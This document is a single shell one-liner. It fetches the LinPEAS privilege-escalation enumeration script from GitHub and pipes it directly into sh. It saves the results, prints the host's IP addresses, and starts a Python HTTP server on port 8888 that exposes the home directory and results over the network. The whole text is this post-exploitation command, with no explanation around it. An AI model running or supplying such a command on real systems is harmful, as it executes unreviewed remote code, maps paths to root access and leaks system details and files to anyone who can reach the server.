curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh > ~/out.txt && hostname -I > out && cat out && python3 -m http.server 8888
